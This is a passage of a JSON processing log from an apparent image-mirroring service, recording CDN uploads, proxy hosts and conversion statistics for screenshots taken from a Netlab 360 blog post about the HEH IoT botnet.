https://api.github.com/repos/myreaderx14/cdn27/contents/2020/10/09/13-42-57-609_f89f0e713dce5e39.webp","historyStatusCode":[],"spendMs":54},"base64UserPassword":null,"token":"6b67d******************************91b08"},"githubUser":"myreaderx14","githubHttpCode":403,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"114.8 KB","destSize":"119.5 KB","compressRate":"104.1%"}],"extra10_invalidATagHrefValue":{},"extra111_proxyServerAndStatMap":{"http://us-018.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-53.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-007.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-035.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-015.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-52.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe70.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-011.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-019.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://europe-57.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-010.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-003.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-027.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/telnet_related_func.png","sourceStatusCode":200,"destWidth":683,"destHeight":147,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn25@2020_3/2020/10/09/13-42-50-484_902a70d8796bac27.webp","sourceBytes":14826,"destBytes":12600,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":3549,"convertSpendMs":50,"createdTime":"2020-10-09 21:42:47","host":"us-010*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"14.5 KB","destSize":"12.3 KB","compressRate":"85%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/send_payload.png","sourceStatusCode":200,"destWidth":1465,"destHeight":1062,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn3@2020_6/2020/10/09/13-42-50-752_807dfd2b461e6e30.webp","sourceBytes":100798,"destBytes":114700,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":3865,"convertSpendMs":51,"createdTime":"2020-10-09 21:42:47","host":"us-019*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","githubUser":"myreaderx32","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"98.4 KB","destSize":"112 KB","compressRate":"113.8%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/port_gen.png","sourceStatusCode":200,"destWidth":563,"destHeight":1245,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn93@2020_3/2020/10/09/13-42-50-760_20a21704bb9694bb.webp","sourceBytes":57195,"destBytes":70976,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":3866,"convertSpendMs":84,"createdTime":"2020-10-09 21:42:47","host":"us-52*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","githubUser":"myreaderx8","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"55.9 KB","destSize":"69.3 KB","compressRate":"124.1%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/start_http_serv.png","sourceStatusCode":200,"destWidth":876,"destHeight":780,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn85@2020_1/2020/10/09/13-42-50-859_3195c428f7fb8f60.webp","sourceBytes":52298,"destBytes":71110,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":3935,"convertSpendMs":43,"createdTime":"2020-10-09 21:42:47","host":"us-015*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"51.1 KB","destSize":"69.4 KB","compressRate":"136%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/self_destroy_cmd.png","sourceStatusCode":200,"destWidth":1084,"destHeight":1026,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn10@2020_6/2020/10/09/13-42-51-000_202e5c76bc818cf6.webp","sourceBytes":149642,"destBytes":182100,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":4232,"convertSpendMs":65,"createdTime":"2020-10-09 21:42:47","host":"us-007*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"146.1 KB","destSize":"177.8 KB","compressRate":"121.7%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/telnet_auth_dict.png","sourceStatusCode":200,"destWidth":1627,"destHeight":375,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn82@2020_5/2020/10/09/13-42-51-493_cfc353adb120fd30.webp","sourceBytes":46612,"destBytes":72014,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":4575,"convertSpendMs":72,"createdTime":"2020-10-09 21:42:47","host":"us-027*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"45.5 KB","destSize":"70.3 KB","compressRate":"154.5%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/exec_cmd_func_overview.png","sourceStatusCode":200,"destWidth":2232,"destHeight":1434,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn96@2020_5/2020/10/09/13-42-51-640_5f3df7002ac54502.webp","sourceBytes":25565,"destBytes":20266,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":4634,"convertSpendMs":166,"createdTime":"2020-10-09 21:42:47","host":"us-53*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"25 KB","destSize":"19.8 KB","compressRate":"79.3%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/human_right_decl.png","sourceStatusCode":200,"destWidth":1560,"destHeight":933,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn18@2020_2/2020/10/09/13-42-51-185_c78c3e90cc348006.webp","sourceBytes":104220,"destBytes":151460,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":5008,"convertSpendMs":55,"createdTime":"2020-10-09 21:42:47","host":"europe-57*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"101.8 KB","destSize":"147.9 KB","compressRate":"145.3%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/kill_serv_by_ports.png","sourceStatusCode":200,"destWidth":457,"destHeight":1029,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn14@2020_3/2020/10/09/13-42-52-980_1981d8cf274df658.webp","sourceBytes":56353,"destBytes":82892,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":6669,"convertSpendMs":24,"createdTime":"2020-10-09 21:42:47","host":"europe70*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"55 KB","destSize":"80.9 KB","compressRate":"147.1%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/cmd_verify.png","sourceStatusCode":200,"destWidth":1106,"destHeight":2109,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn2@2020_1/2020/10/09/13-42-53-358_a49bfa018663d940.webp","sourceBytes":163922,"destBytes":188614,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":6568,"convertSpendMs":105,"createdTime":"2020-10-09 21:42:47","host":"us-018*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"160.1 KB","destSize":"184.2 KB","compressRate":"115.1%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/bot_cmd_st.png","sourceStatusCode":200,"destWidth":1366,"destHeight":1586,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn90@2020_4/2020/10/09/13-42-54-022_1dc3b6853b9751c4.webp","sourceBytes":181741,"destBytes":305530,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":7431,"convertSpendMs":224,"createdTime":"2020-10-09 21:42:47","host":"us-003*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","githubUser":"myreaderx29","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"177.5 KB","destSize":"298.4 KB","compressRate":"168.1%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/http_server.png","sourceStatusCode":200,"destWidth":2000,"destHeight":1053,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn22@2020_1/2020/10/09/13-43-01-616_fed2f2fa887b029c.webp","sourceBytes":1262353,"destBytes":196176,"targetWebpQuality":75,"feedId":9360,"totalSpendMs":14802,"convertSpendMs":138,"createdTime":"2020-10-09 21:42:47","host":"us-035*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet/","linkMd5ListStr":"2d2d0d31fa25160e426a7352f012ebce","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"1.2 MB","destSize":"191.6 KB","compressRate":"15.5%"}],"successGithubMap":{"myreaderx8":1,"myreaderx6":1,"myreaderx32":1,"myreaderx33":1,"myreaderx22":1,"myreaderx2":1,"myreaderx13":1,"myreaderx24":1,"myreaderx30":1,"myreaderx5oss":1,"myreaderx31":1,"myreaderx29":1},"failGithubMap":{"myreaderx14":1,"myreaderx23":1}}